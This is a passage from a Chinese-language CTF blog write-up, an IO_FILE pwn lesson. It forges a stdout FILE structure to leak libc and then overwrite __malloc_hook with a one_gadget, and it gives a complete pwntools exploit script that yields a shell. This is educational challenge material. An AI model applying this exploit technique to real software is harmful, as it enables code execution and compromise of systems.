class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有栈溢出，可以从溢出 .data 到 .bss</p>
<p>有格式化字符串漏洞，先看看stack中的数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7ffec7539a30</span> ◂— <span class="number">0xffffffffdeadbeef</span></span><br><span class="line">... ↓        <span class="number">49</span> skipped</span><br><span class="line"><span class="number">32</span>:<span class="number">0190</span>│       <span class="number">0x7ffec7539bc0</span> ◂— <span class="number">0xffffffffdeadbeef</span></span><br><span class="line">... ↓          <span class="number">9</span> skipped</span><br><span class="line"><span class="number">3</span>c:<span class="number">01e0</span>│ rbp<span class="number">-3</span> <span class="number">0x7ffec7539c10</span> ◂— <span class="number">0x80a539c3e</span></span><br><span class="line"><span class="number">3</span>d:<span class="number">01e8</span>│       <span class="number">0x7ffec7539c18</span> ◂— <span class="number">0xbc0cd56dea1a9800</span></span><br><span class="line"><span class="number">3</span>e:<span class="number">01f</span>0│       <span class="number">0x7ffec7539c20</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">3f</span>:<span class="number">01f</span>8│       <span class="number">0x7ffec7539c28</span> —▸ <span class="number">0x563924a00a50</span> ◂— push   r15</span><br><span class="line"><span class="number">40</span>:<span class="number">0200</span>│       <span class="number">0x7ffec7539c30</span> —▸ <span class="number">0x563924a00940</span> ◂— <span class="keyword">xor</span>    ebp, ebp</span><br><span class="line"><span class="number">41</span>:<span class="number">0208</span>│       <span class="number">0x7ffec7539c38</span> —▸ <span class="number">0x7ffec7539d20</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">42</span>:<span class="number">0210</span>│       <span class="number">0x7ffec7539c40</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">43</span>:<span class="number">0218</span>│       <span class="number">0x7ffec7539c48</span> —▸ <span class="number">0x7f72569c2840</span> (__libc_start_main+<span class="number">240</span>) ◂— mov    edi, eax</span><br><span class="line"><span class="number">44</span>:<span class="number">0220</span>│       <span class="number">0x7ffec7539c50</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">45</span>:<span class="number">0228</span>│       <span class="number">0x7ffec7539c58</span> —▸ <span class="number">0x7ffec7539d28</span> —▸ <span class="number">0x7ffec753a39b</span> ◂— <span class="number">0x54006e69616d2f2e</span> <span class="comment">/* &#x27;./main&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x0</span></span><br><span class="line"> RBX  <span class="number">0x563924c02010</span> ◂— <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"> RCX  <span class="number">0xdeadbeef</span></span><br><span class="line"> RDX  <span class="number">0xdeadbeef</span></span><br><span class="line"> RDI  <span class="number">0x1</span></span><br><span class="line"> RSI  <span class="number">0x563924c02010</span> ◂— <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"> R8   <span class="number">0xdeadbeef</span></span><br><span class="line"> R9   <span class="number">0xdeadbeef</span></span><br><span class="line"> R10  <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x246</span></span><br><span class="line"> R12  <span class="number">0xdeadbeef</span></span><br><span class="line"> R13  <span class="number">0x7f7256d656e0</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"> R14  <span class="number">0x7f7256d67620</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7ffec7539c13</span> ◂— <span class="number">0x1a9800000000080a</span></span><br><span class="line">*RSP  <span class="number">0x7ffec7539a30</span> ◂— <span class="number">0xffffffffdeadbeef</span></span><br><span class="line">*RIP  <span class="number">0x563924a00921</span> ◂— call   <span class="number">0x563924a006a0</span></span><br></pre></td></tr></table></figure>
<p>初步计算得知偏移为“73”，但程序开了FORTIFY，只能另寻他路</p>
<p><strong>入侵思路</strong></p>
<p>FORTIFY阻止了格式化字符串，这时就需要 stdout 任意读，这就需要劫持或伪造 stdout 的FILE结构体（看起来好像难以完成，似乎不可能控制该FILE结构体）</p>
<p>但在栈中有办法可以伪造FILE，程序使用了“stdout”关键字（并且没有初始化），所以“stdout”会出现在 .bss 中，可以通过覆盖“stdout”的值来伪造FILE结构体的位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000202010</span> ptr             db <span class="string">&#x27;hello world&#x27;</span>,<span class="number">0</span>     </span><br><span class="line">.bss:<span class="number">0000000000202020</span> <span class="built_in">stdout</span>          dq ?                    </span><br></pre></td></tr></table></figure>
<p>先绕开PIE：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;So I change the buffer location to &#x27;</span>)</span><br><span class="line">leak_addr=eval(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>])</span><br><span class="line">pro_base=leak_addr<span class="number">-2105360</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;pro_base &gt;&gt; &#x27;</span>+hex(pro_base))</span><br></pre></td></tr></table></figure>
<p>stdout 任意读需要的条件是：</p>
<ul>
<li>设置 <code>_flag &amp;~ _IO_NO_WRITES</code> 即 <code>_flag &amp;~ 0x8</code></li>
<li>设置 <code>_flag &amp; _IO_CURRENTLY_PUTTING</code> 即 <code>_flag | 0x800</code></li>
<li>设置 <code>_fileno</code> 为1</li>
<li>设置 <code>_IO_write_base</code> 指向想要泄露的地方</li>
<li>设置 <code>_IO_write_ptr</code> 指向泄露结束的地址</li>
<li>设置 <code>_IO_read_end</code> 等于 <code>_IO_write_base</code> 或设置 <code>_flag &amp; _IO_IS_APPENDING</code>（即 <code>_flag | 0x1000</code>）</li>
<li>设置 <code>_IO_write_end</code> 等于 <code>_IO_write_ptr</code> （非必须）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p* &amp; *<span class="built_in">stdout</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  _flags = <span class="number">-72537977</span>,</span><br><span class="line">  _IO_read_ptr = <span class="number">0x7f4fa3d276a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_read_end = <span class="number">0x7f4fa3d276a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_read_base = <span class="number">0x7f4fa3d276a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_write_base = <span class="number">0x7f4fa3d276a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_write_ptr = <span class="number">0x7f4fa3d276a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_write_end = <span class="number">0x7f4fa3d276a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_buf_base = <span class="number">0x7f4fa3d276a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_buf_end = <span class="number">0x7f4fa3d276a4</span> &lt;_IO_2_1_stdout_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">  _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">  _markers = <span class="number">0x0</span>,</span><br><span class="line">  _chain = <span class="number">0x7f4fa3d268e0</span> &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">  _fileno = <span class="number">1</span>,</span><br><span class="line">  _flags2 = <span class="number">0</span>,</span><br><span class="line">  _old_offset = <span class="number">-1</span>,</span><br><span class="line">  _cur_column = <span class="number">0</span>,</span><br><span class="line">  _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">  _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _lock = <span class="number">0x7f4fa3d28780</span> &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">  _offset = <span class="number">-1</span>,</span><br><span class="line">  _codecvt = <span class="number">0x0</span>,</span><br><span class="line">  _wide_data = <span class="number">0x7f4fa3d267a0</span> &lt;_IO_wide_data_1&gt;,</span><br><span class="line">  _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">  _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">  __pad5 = <span class="number">0</span>,</span><br><span class="line">  _mode = <span class="number">-1</span>,</span><br><span class="line">  _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x00007f9e532ca620</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f9e532ca620</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span> <span class="comment">/* _flags */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f9e532ca628</span> (_IO_2_1_stdout_+<span class="number">8</span>) —▸ <span class="number">0x7f9e532ca6a3</span> (_IO_2_1_stdout_+<span class="number">131</span>) ◂— <span class="number">0x2cb780000000000a</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line">... ↓     <span class="number">6</span> skipped</span><br></pre></td></tr></table></figure>
<p>_flag 的伪造相对麻烦一点，其他的伪造只要知道程序基地址就行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="number">0xfbad2887</span>&amp;~<span class="number">0x8</span>|<span class="number">0x800</span> </span><br><span class="line">Out[<span class="number">1</span>]: <span class="number">4222429319</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: hex(<span class="number">4222429319</span>) <span class="comment">/* 就是_flag本身,_flag的基础检查已经完成 */</span></span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">&#x27;0xfbad2887&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]:  <span class="number">0xfbad2887</span>|<span class="number">0x8000</span> <span class="comment">/* 这里的&quot;|0x8000&quot;是为了满足printf的条件(后续进行分析) */</span></span><br><span class="line">Out[<span class="number">3</span>]: <span class="number">4222462087</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: hex(<span class="number">4222462087</span>) <span class="comment">/* _flag完成计算 */</span></span><br><span class="line">Out[<span class="number">4</span>]: <span class="string">&#x27;0xfbada887&#x27;</span></span><br></pre></td></tr></table></figure>
<p>下面这个函数是我从网上抄的，还挺好用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FILE</span>(<span class="params">_flags=<span class="number">0</span>,_IO_read_ptr=<span class="number">0</span>,_IO_read_end=<span class="number">0</span>,_IO_read_base=<span class="number">0</span>,_IO_write_base=<span class="number">0</span>,_IO_write_ptr=<span class="number">0</span>,_IO_write_end=<span class="number">0</span>,_IO_buf_base=<span class="number">0</span>,_IO_buf_end=<span class="number">1</span>,_fileno=<span class="number">0</span>,_chain=<span class="number">0</span></span>):</span></span><br><span class="line">	fake_IO = flat([</span><br><span class="line">	_flags,</span><br><span class="line">	_IO_read_ptr, _IO_read_end, _IO_read_base,</span><br><span class="line">	_IO_write_base, _IO_write_ptr, _IO_write_end,</span><br><span class="line">	_IO_buf_base, _IO_buf_end])</span><br><span class="line">	fake_IO += flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,_chain,_fileno])</span><br><span class="line">	fake_IO += flat([<span class="number">0xFFFFFFFFFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xFFFFFFFFFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">	fake_IO += flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">return</span> fake_IO</span><br><span class="line"></span><br><span class="line">fake_IO_addr=pro_base+<span class="number">0x202028</span></span><br><span class="line">fake_IO = FILE(_flags = <span class="number">0xfbada887</span>,_IO_write_base = pro_base + <span class="number">0x201FE0</span>,_IO_write_ptr = pro_base+ <span class="number">0x201FE0</span> + <span class="number">8</span>,_fileno = <span class="number">1</span>,_IO_read_end=pro_base + <span class="number">0x201FE0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">设置_IO_write_base指向想要泄露的地方</span></span><br><span class="line"><span class="string">设置_IO_write_ptr指向泄露结束的地址</span></span><br><span class="line"><span class="string">设置_IO_read_end等于_IO_write_base或设置_flag &amp; _IO_IS_APPENDING</span></span><br><span class="line"><span class="string">设置_IO_write_end等于_IO_write_ptr(非必须)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(fake_IO_addr)</span><br><span class="line">payload += fake_IO</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
<p>整体思路就是覆盖 .bss 上的“stdout”为一个可控地址，然后在这里写入 fake_IO</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55ff2a202010</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rbx r10 <span class="number">0x55ff2a202010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x55ff2a202018</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x55ff2a202020</span> (<span class="built_in">stdout</span>) —▸ <span class="number">0x55ff2a202028</span> ◂— <span class="number">0xfbada887</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ r14     <span class="number">0x55ff2a202028</span> ◂— <span class="number">0xfbada887</span></span><br><span class="line">    <span class="comment">/* _flags */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x55ff2a202030</span> ◂— <span class="number">0x0</span></span><br><span class="line">    <span class="comment">/* _IO_read_ptr */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x55ff2a202038</span> —▸ <span class="number">0x55ff2a201fe0</span> —▸ <span class="number">0x7f4796932750</span> (__libc_start_main) ◂— push   r14 </span><br><span class="line">    <span class="comment">/* _IO_read_end */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0x55ff2a202040</span> ◂— <span class="number">0x0</span></span><br><span class="line">    <span class="comment">/* _IO_read_base */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x55ff2a202048</span> —▸ <span class="number">0x55ff2a201fe0</span> —▸ <span class="number">0x7f4796932750</span> (__libc_start_main) ◂— push   r14</span><br><span class="line">    <span class="comment">/* _IO_write_base */</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55ff2a202050</span> —▸ <span class="number">0x55ff2a201fe8</span> ◂— <span class="number">0x0</span></span><br><span class="line">    <span class="comment">/* _IO_write_ptr */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;rewrite vtable is not permitted!\n&quot;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr<span class="number">-132944</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
<p>获取了基础信息，就需要用 stdout 任意写来获取shell了，stdout 任意写的条件是：</p>
<ul>
<li>设置 <code>_IO_write_ptr</code> 指向 <code>write_start</code> （目标地址）</li>
<li>设置 <code>_IO_write_end</code> 指向 <code>write_end</code> （目标地址结束）</li>
</ul>
<p>注意：接下来的 stdout 任意写还是基于printf，所以“_flag|0x8000”这一步必须存在</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_write = FILE(_flags = <span class="number">0xfbada887</span>,_IO_write_ptr = malloc_hook,_IO_write_end = malloc_hook + <span class="number">8</span>,_fileno = <span class="number">0</span>)</span><br><span class="line">payload  = p64(one_gadget) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pro_base+<span class="number">0x202028</span>)</span><br><span class="line">payload += fake_IO_write</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;%n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>程序会把输入的数据覆盖到 <code>_IO_write_ptr</code>（mallo_hook），也就是把进行了 malloc_hook 劫持</p>
<p>其中 <code>%n</code> 可触发malloc的原因是在于： <code>__readonly_area</code> 会通过 <code>fopen</code> 打开 <code>maps</code> 文件来读取内容来判断地址段是否可写，而 <code>fopen</code> 会调用 <code>malloc</code> 函数申请空间，因此触发</p>
<p>在 <code>printf</code> 函数中会调用 <code>_IO_acquire_lock_clear_flags2 (stdout)</code> 来获取 <code>lock</code> 从而继续程序，如果没有 <code>_IO_USER_LOCK</code> 标志的话，程序会一直在循环，而 <code>_IO_USER_LOCK</code> 定义为 <code>#define _IO_USER_LOCK 0x8000</code> ，因此需要设置 <code>flag|=0x8000</code> 才能够使exp顺利进行</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;AMD64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FILE</span>(<span class="params">_flags=<span class="number">0</span>,_IO_read_ptr=<span class="number">0</span>,_IO_read_end=<span class="number">0</span>,_IO_read_base=<span class="number">0</span>,_IO_write_base=<span class="number">0</span>,_IO_write_ptr=<span class="number">0</span>,_IO_write_end=<span class="number">0</span>,_IO_buf_base=<span class="number">0</span>,_IO_buf_end=<span class="number">1</span>,_fileno=<span class="number">0</span>,_chain=<span class="number">0</span></span>):</span></span><br><span class="line">	fake_IO = flat([</span><br><span class="line">	_flags,</span><br><span class="line">	_IO_read_ptr, _IO_read_end, _IO_read_base,</span><br><span class="line">	_IO_write_base, _IO_write_ptr, _IO_write_end,</span><br><span class="line">	_IO_buf_base, _IO_buf_end])</span><br><span class="line">	fake_IO += flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,_chain,_fileno])</span><br><span class="line">	fake_IO += flat([<span class="number">0xFFFFFFFFFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xFFFFFFFFFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">	fake_IO += flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">return</span> fake_IO</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;So I change the buffer location to &#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">eval</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">pro_base=leak_addr-<span class="number">2105360</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;pro_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">fake_IO_addr=pro_base+<span class="number">0x202028</span></span><br><span class="line">fake_IO = FILE(_flags = <span class="number">0xfbada887</span>,_IO_write_base = pro_base + <span class="number">0x201FE0</span>,_IO_write_ptr = pro_base+ <span class="number">0x201FE0</span> + <span class="number">8</span>,_fileno = <span class="number">1</span>,_IO_read_end=pro_base + <span class="number">0x201FE0</span>)</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(fake_IO_addr)</span><br><span class="line">payload += fake_IO</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;rewrite vtable is not permitted!\n&quot;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">132944</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">one_gadget_list=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget = one_gadget_list[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line">fake_IO_write = FILE(_flags = <span class="number">0xfbada887</span>,_IO_write_ptr = malloc_hook,_IO_write_end = malloc_hook + <span class="number">8</span>,_fileno = <span class="number">0</span>)</span><br><span class="line">payload  = p64(one_gadget) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pro_base+<span class="number">0x202028</span>)</span><br><span class="line">payload += fake_IO_write</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;%n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这就是 IO_pwn 的最后一个内容了，另外还收获了一个很好用的模板</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
